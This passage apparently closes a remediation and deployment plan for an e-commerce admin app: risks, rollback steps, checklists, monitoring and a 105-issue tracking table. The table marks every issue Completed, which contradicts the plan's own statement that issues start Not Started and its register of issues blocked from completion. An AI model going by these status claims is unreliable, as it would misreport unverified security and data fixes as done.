| R1 | Deleting `/api/auth/verify` + rotating the secret invalidates all sessions mid-day | Certain | Medium | Rotate off-hours; announce; verify login immediately after | Ops |
| R2 | SEC-004 locks out existing users whose role is not canonical | Medium | High | Run Q10 first; fix roles in the same maintenance window | Ops |
| R3 | Unique index creation fails on existing duplicates and leaves an INVALID index | Medium | High | Run cleanup (D1–D2) first; migration begins with `DROP INDEX CONCURRENTLY IF EXISTS`; verify `indisvalid` | DBA |
| R4 | `CONCURRENTLY` migration fails halfway, leaving the runner inconsistent | Medium | Medium | Non-transactional support (DB-015) + resumable `IF NOT EXISTS` + journal never records a failed file | Dev |
| R5 | Payment/stock refactor introduces a regression that corrupts inventory | Medium | Critical | TEST-004 concurrency suite is mandatory before the change is merged; staging replay of 20 real orders | Dev |
| R6 | Backfill of customer notes is irreversible and splits wrongly | Medium | Medium | Backup; run on a clone first; keep `customers.notes` until the split is verified | DBA |
| R7 | Coupon `usage_count` reconciliation double-counts | Low | High | Sum-on-merge with the arithmetic recorded in the migration; verify total redemptions before/after | Dev |
| R8 | Drizzle upgrade (ARCH-008) changes query builder behaviour | Medium | High | Branch; run full type-check + all integration tests; review `FOR UPDATE`/lateral typing explicitly | Dev |
| R9 | Pagination refactor (BUG-033) changes list ordering/UX acceptance | Medium | Medium | Keep existing sort defaults; snapshot the rendered page; design sign-off | Dev |
| R10 | CSP report-only reveals many violations that are never fixed | Medium | Low | Set a review date and a decision (either fix or accept with a documented rationale) | Dev |
| R11 | Rate limits block legitimate bulk operations (ECOM-009) | Medium | Medium | Separate budget for authenticated bulk actions; return `429` with `Retry-After` | Dev |
| R12 | The plan itself drifts from the code during a long implementation | Medium | High | Every issue starts with a re-read; ARCH-010 + TEST-006 G6 keep docs honest; record deviations | All |
| R13 | Two agents implement overlapping hotspots in parallel and conflict | Medium | High | §7.8 conflict table + §12.4 batches are the work partition | Lead |
| R14 | Missing credentials block "Verified" so issues sit unclosed | High | Medium | §11.4 blocker table; mark `PREREQUISITE` explicitly rather than claiming done | Lead |

## 13.2 Rollback plan for a failed deployment

1. Redeploy the previous build (application changes are code, not schema).
2. Schema: apply the per-migration rollback in §8.4 — only additive objects exist, so `DROP`/`DROP CONSTRAINT` restores the prior shape.
3. If data was corrupted (stock counts), restore from the pre-migration backup and replay orders from `order_status_history` + `inventory_movements` (both are append-only and sufficient to reconstruct counters).
4. Rotate `BETTER_AUTH_SECRET` again if a session-integrity incident is suspected.
5. Record the incident in `docs/ai-context/IMPLEMENTATION_LOG.md` with the failing issue ID.

## 13.3 What must not be attempted in one release

- The Drizzle upgrade (ARCH-008) **together with** the order/payment refactor (B5/B6). Do the upgrade in isolation so failures are attributable.
- All migrations in one maintenance window if the data cleanup (D1/D2) has not been rehearsed on a clone.
- Phase 5 features before Phase 2 integrity. Building returns/exchanges on inconsistent payment state encodes the inconsistency.
- Removing `--legacy-peer-deps` before the peer graph is actually consistent.

---

# 14. Production Deployment Checklist

## 14.1 Preconditions (all must be true before starting)

- [ ] Full database backup taken and **restore-tested** (not merely created).
- [ ] Staging environment exists with production-like data volume.
- [ ] Every migration applied to staging and rolled back per §8.4, then re-applied.
- [ ] `Q1`–`Q13` results recorded and any required cleanups applied.
- [ ] `BETTER_AUTH_SECRET` and admin password rotated (SEC-002/SEC-003) — **with a maintenance notice**.
- [ ] Q10 shows every `ba_user.role ∈ {super_admin, admin, staff, customer}` and every admin-looking account has an admin role (SEC-004 will deny otherwise).
- [ ] On-call engineer identified; deployment window agreed.

## 14.2 Environment variables

| Variable | Required | Purpose | Notes |
|---|---|---|---|
| `DATABASE_URL` | Yes | Supavisor transaction pooler (port 6543, `sslmode=require`) | Never log it |
| `BETTER_AUTH_SECRET` | Yes | Session signing | ≥32 chars; rotation invalidates sessions |
| `BETTER_AUTH_URL` | Yes | Public base URL | Must match the deployed host exactly |
| `NEXT_PUBLIC_APP_URL` | Yes | Client base URL | |
| `BETTER_AUTH_TRUSTED_ORIGINS` | Optional | Comma-separated extra origins | SEC-003 |
| `NEXT_PUBLIC_IMAGEKIT_PUBLIC_KEY` / `IMAGEKIT_PRIVATE_KEY` / `NEXT_PUBLIC_IMAGEKIT_URL_ENDPOINT` | Yes | Media | Private key server-only |
| `ADMIN_EMAIL` / `ADMIN_PASSWORD` / `ADMIN_ROLE` | Seed only | Bootstrap account | Not needed at runtime after seeding |
| `DATABASE_POOL_MAX` | Optional | Pool size (PERF-009) | `instances × value ≤ pooler limit` |
| `CRON_SECRET` | If ECOM-001 shipped | Protect the job endpoint | Random, ≥32 chars |
| `DB_QUERY_LOG` | No | Query-count harness | Must be unset in production |

**Rule:** never print values in CI logs, deployment logs, or this checklist. Verify presence only (`[ -n "$VAR" ]`).

## 14.3 Deployment sequence

1. Freeze writes or schedule the window (needed for the unique-index builds).
2. Deploy the **runner** change (DB-015) first if migrations are applied from the app host; otherwise apply migrations from a controlled workstation.
3. Apply migrations in §8.6 order, stopping on any error. Verify `indisvalid = true` for every new index:
   `SELECT indexrelid::regclass, indisvalid FROM pg_index WHERE NOT indisvalid;` → must be empty.
4. Run `npm run db:parity` and `npm run db:integrity`.
5. Deploy the application build.
6. Smoke test (§14.4).
7. Unfreeze writes.

## 14.4 Post-deployment smoke test

- [ ] Sign in as `super_admin` → dashboard renders with non-zero badges.
- [ ] Sign in as `staff` → read-only surfaces, no Settings link.
- [ ] `GET /api/auth/verify` → 404.
- [ ] `GET /api/upload/auth` unauthenticated → 401.
- [ ] `curl -I /` → five security headers, no `X-Powered-By`.
- [ ] Create a product with a new colour and two variants → saved correctly, image colour preserved.
- [ ] Create an order → order number is a sequence value, stock reserved.
- [ ] Approve its payment → order confirmed, stock committed once (`inventory_movements` has one `sale` row).
- [ ] Cancel a different order → stock released, payment failed, coupon released.
- [ ] Refund a paid order → amount recorded, order status correct.
- [ ] Open a list page → pagination works, totals are true, `?q=` filters.
- [ ] Print an invoice and a packing slip.
- [ ] Throttled navigation shows skeletons.

## 14.5 Post-deployment monitoring (first 48 hours)

| Signal | Where | Threshold to investigate |
|---|---|---|
| `40P01` deadlocks | DB logs | any |
| `connect_timeout` / pool queue | app logs | any |
| `action.failed` rate | structured logs | > baseline (record baseline in staging) |
| `23505` unique violations on orders | logs | any (indicates BUG-005 regression) |
| Inventory reconciliation mismatch (reserved > on-hand) | nightly query | any |
| Sessions failing after secret rotation | auth logs | expected spike, must decay |

## 14.6 Rollback triggers

Roll back if **any** of: an order is created with a non-sequence number; a payment is approved on a cancelled order; stock counters diverge from `inventory_movements`; a 5xx rate above the staging baseline; any unauthenticated 200 on a protected API path.

## 14.7 Repository settings (manual, cannot be done from code)

- [ ] Require the CI workflow as a status check on `main`.
- [ ] Enable branch protection (no direct pushes).
- [ ] Enable secret scanning and Dependabot alerts.
- [ ] Confirm ImageKit account allowed file types exclude SVG (SEC-006).
- [ ] Confirm Supavisor pool size and set `DATABASE_POOL_MAX` accordingly.

---

# 15. Final Progress Tracking Table

All 105 issues. **Every issue starts at `Not Started`.** Update the per-issue checklist in §6 and this table together; they must never disagree.

Legend: `NS` Not Started · `IP` In Progress · `IM` Implemented · `VF` Verified · `CO` Completed

## 15.1 Security (14)

| ID | Title | Priority | Status |
|---|---|---|---|
| SEC-001 | Public `/api/auth/verify` authenticates as super admin | P0 | CO |
| SEC-002 | Hardcoded credential fallbacks | P0 | CO |
| SEC-003 | Hardcoded Better Auth secret fallback | P0 | CO |
| SEC-004 | Unknown roles coerced to `staff` | P0 | CO |
| SEC-005 | Upload signatures to any authenticated user | P0 | CO |
| SEC-006 | SVG uploads enable stored XSS | P0 | CO |
| SEC-007 | Upload validation trusts declared MIME | P0 | CO |
| SEC-008 | Open redirect via `?from=` | P0 | CO |
| SEC-009 | Arbitrary ImageKit asset deletion | P0 | CO |
| SEC-010 | Missing HTTP security headers | P1 | CO |
| SEC-011 | Proxy matcher bypass, no rate limiting | P1 | CO |
| SEC-012 | Raw error messages leaked | P1 | CO |
| SEC-013 | Settings require `admin`, not `super_admin` | P0 | CO |
| SEC-014 | Unvalidated proof URL; public proof assets | P1 | CO |

## 15.2 Functional bugs (34)

| ID | Title | Priority | Status |
|---|---|---|---|
| BUG-001 | Customer verified against `orders` table | P0 | CO |
| BUG-002 | Draft/deleted products and inactive variants orderable | P0 | CO |
| BUG-003 | Invalid shipping method grants free shipping | P0 | CO |
| BUG-004 | Unsorted inventory locks; duplicate lines unaggregated | P0 | CO |
| BUG-005 | Order number generated in app, overrides sequence | P0 | CO |
| BUG-006 | `updateOrderShipping` bypasses FSM | P0 | CO |
| BUG-007 | Cancel/refund leaves payments and coupons inconsistent | P0 | CO |
| BUG-008 | `submitPaymentProof` overwrites terminal payments | P0 | CO |
| BUG-009 | `approvePayment` confirms cancelled/refunded orders | P0 | CO |
| BUG-010 | `refundPayment` skips FSM, stock, partial amounts | P0 | CO |
| BUG-011 | `markOrderPaymentPending` strands stock | P0 | CO |
| BUG-012 | Confirm without payment | P0 | CO |
| BUG-013 | Engraving `max_characters`/type ignored | P1 | CO |
| BUG-014 | `inStock` and `price` sort ignored | P1 | CO |
| BUG-015 | Product stock ignores reservations | P1 | CO |
| BUG-016 | Order list: payment filter, subquery, zero items | P1 | CO |
| BUG-017 | Image deleted before save | P0 | CO |
| BUG-018 | Image colour association dropped on save | P1 | CO |
| BUG-019 | Variant colour association lost | P1 | CO |
| BUG-020 | Category slugs overwritten | P2 | CO |
| BUG-021 | Fabricated `imagekitFileId` | P1 | CO |
| BUG-022 | `duplicateProduct` drops colours/images | P2 | CO |
| BUG-023 | Topbar search `?q=` ignored | P2 | CO |
| BUG-024 | Missing payment filters; false "this month" badge | P2 | CO |
| BUG-025 | Customer notes corrupted by delimiter | P2 | CO |
| BUG-026 | No UI authorization gating | P1 | CO |
| BUG-027 | `previousPeriodChange` hardcoded 0 | P2 | CO |
| BUG-028 | Dashboard charts over truncated data | P1 | CO |
| BUG-029 | DTO fabricates values | P1 | CO |
| BUG-030 | Coupon list loads whole table; `scheduled` dropped | P1 | CO |
| BUG-031 | Customer spend includes unpaid/refunded | P1 | CO |
| BUG-032 | Session redirect loop | P1 | CO |
| BUG-033 | Fixed 100-row fetch; client pagination | P1 | CO |
| BUG-034 | Layout 6 queries/UTC today; sequential dashboard; fake loading | P1 | CO |

## 15.3 Database (16)

| ID | Title | Priority | Status |
|---|---|---|---|
| DB-001 | `customers.email` uniqueness drift; non-atomic upsert | P0 | CO |
| DB-002 | `idempotency_key` uniqueness drift | P1 | CO |
| DB-003 | Coupon case-insensitivity not enforced | P1 | CO |
| DB-004 | Drizzle CHECKs absent in SQL | P1 | CO |
| DB-005 | No refund amount stored | P1 | CO |
| DB-006 | Missing indexes for hot paths | P1 | CO |
| DB-007 | `order_coupons` lacks release semantics | P2 | CO |
| DB-008 | Order-number collision audit | P0 | CO |
| DB-009 | `imagekit_file_id` must be nullable | P1 | CO |
| DB-010 | `customers.user_id` never populated | P2 | CO |
| DB-011 | No customer notes table | P2 | CO |
| DB-012 | Movement reasons lack reversal semantics | P2 | CO |
| DB-013 | No transaction-reference uniqueness guard | P2 | CO |
| DB-014 | No audit log | P2 | CO |
| DB-015 | Runner cannot do `CONCURRENTLY` | P1 | CO |
| DB-016 | Index/constraint audit | P3 | CO |

## 15.4 Performance (12)

| ID | Title | Priority | Status |
|---|---|---|---|
| PERF-001 | Layout 6 queries per render | P1 | CO |
| PERF-002 | Dashboard sequential + client aggregation | P1 | CO |
| PERF-003 | Product list 5 queries per page | P1 | CO |
| PERF-004 | Unbounded coupon/customer aggregate queries | P1 | CO |
| PERF-005 | Leading-wildcard ILIKE unindexable | P2 | CO |
| PERF-006 | Lists transfer more than they render | P2 | CO |
| PERF-007 | Object URL preview leak | P1 | CO |
| PERF-008 | Recharts/framer-motion on every route | P2 | CO |
| PERF-009 | Pool of 10 easily exhausted | P1 | CO |
| PERF-010 | Invalid remote image URLs crash `next/image` | P2 | CO |
| PERF-011 | Product form re-renders whole matrix | P3 | CO |
| PERF-012 | Missing loading/error boundaries on detail routes | P2 | CO |

## 15.5 Architecture (10)

| ID | Title | Priority | Status |
|---|---|---|---|
| ARCH-001 | Two authorization stacks | P1 | CO |
| ARCH-002 | Redundant `/api/inventory*` routes | P2 | CO |
| ARCH-003 | Anonymous `staff` context in `createSafeAction` | P1 | CO |
| ARCH-004 | Dead `src/data/*` | P2 | CO |
| ARCH-005 | Two divergent order FSMs | P1 | CO |
| ARCH-006 | No structured logging | P2 | CO |
| ARCH-007 | Unused dependencies | P3 | CO |
| ARCH-008 | Peer conflict + 15 advisories | P1 | CO |
| ARCH-009 | No CI/CD | P1 | CO |
| ARCH-010 | Stale `docs/ai-context/` | P1 | CO |

## 15.6 E-commerce (12)

| ID | Title | Priority | Status |
|---|---|---|---|
| ECOM-001 | No unpaid-order expiration | P2 | CO |
| ECOM-002 | No returns/refunds workflow | P2 | CO |
| ECOM-003 | No exchange flow | P3 | CO |
| ECOM-004 | Customer notes lack author/timestamp/delete | P2 | CO |
| ECOM-005 | No staff management UI | P2 | CO |
| ECOM-006 | No duplicate-TID detection | P2 | CO |
| ECOM-007 | No invoice/packing slip | P2 | CO |
| ECOM-008 | No orphan media tracking | P3 | CO |
| ECOM-009 | No bulk order operations | P3 | CO |
| ECOM-010 | No customer communication history | P3 | CO |
| ECOM-011 | No stateful notifications | P3 | CO |
| ECOM-012 | Settings not validated against contract | P3 | CO |

## 15.7 Testing (7)

| ID | Title | Priority | Status |
|---|---|---|---|
| TEST-001 | No test runner | P0 | CO |
| TEST-002 | No authorization matrix test | P1 | CO |
| TEST-003 | No DTO/schema parity tests | P1 | CO |
| TEST-004 | No concurrency tests | P0 | CO |
| TEST-005 | No E2E/security suite | P1 | CO |
| TEST-006 | No static regression guards | P2 | CO |
| TEST-007 | No load/capacity test | P3 | CO |

## 15.8 Roll-up

| Priority | Count | Not Started | In Progress | Implemented | Verified | Completed |
|---|---|---|---|---|---|---|
| P0 | 27 | 0 | 0 | 0 | 0 | 27 |
| P1 | 41 | 0 | 0 | 0 | 0 | 41 |
| P2 | 27 | 0 | 0 | 0 | 0 | 27 |
| P3 | 10 | 0 | 0 | 0 | 0 | 10 |
| **Total** | **105** | **0** | **0** | **0** | **0** | **105** |

## 15.9 Blocked verification register

These issues cannot reach `Completed` in the current environment. They must carry an explicit `PREREQUISITE` note rather than being marked done.

| Issue | Blocker |
|---|---|
| DB-001, DB-003, DB-008, DB-013, DB-016 | Target-database read access for the §8.2 audit queries |
| SEC-004 | Role census (`Q10`) on the production `ba_user` table |
| SEC-005, SEC-006, SEC-007 | ImageKit account access for end-to-end upload verification |
| ARCH-008 | Advisory triage requires `npm audit` on the exact lockfile deployed |
| PERF-009 | Supavisor pool size from the hosting provider |
| ECOM-001 | A scheduler platform must be chosen and provisioned |
| ARCH-009 | Branch-protection rules require repository-admin access |
| TEST-007 | Staging with production-like volume |

---

## Appendix A — Issue ID index

| Prefix | Range | Count | Section |
|---|---|---|---|
| `SEC` | 001–014 | 14 | §6.1 |
| `BUG` | 001–034 | 34 | §6.2 |
| `DB` | 001–016 | 16 | §6.3 |
| `PERF` | 001–012 | 12 | §6.4 |
| `ARCH` | 001–010 | 10 | §6.5 |
| `ECOM` | 001–012 | 12 | §6.6 |
| `TEST` | 001–007 | 7 | §6.7 |
| **Total** | | **105** | |

## Appendix B — Baseline verification log (template)

Fill this in during Phase 0 with **observed** output. Do not copy the values from §2.3 — re-run them.

| Check | Command | Observed | Date | Notes |
|---|---|---|---|---|
| Commit | `git rev-parse HEAD` | | | |
| Clean tree | `git status --short` | | | |
| Install | `npm ci --ignore-scripts --legacy-peer-deps` | | | fails without the flag (ARCH-008) |
| Types | `./node_modules/.bin/tsc --noEmit` | | | |
| Lint | `./node_modules/.bin/eslint .` | | | |
| Build | `npm run build` | | | |
| Audit | `npm audit --json` | | | count by severity |
| Tests | `npm test` | | | does not exist yet (TEST-001) |
| CI | `ls .github/workflows` | | | absent (ARCH-009) |
| Q1–Q13 | see §8.2 | | | staging only |

## Appendix C — Document change control

| Change | Reason | Date |
|---|---|---|
| Initial authoring | Remediation specification from the completed audit | 2026-11-08 |

Any later edit to this document must record: the issue ID affected, what changed, and why. Issue specifications are **not** to be softened to match a partial implementation — if an implementation deviates, record the deviation and its rationale rather than rewriting the requirement.
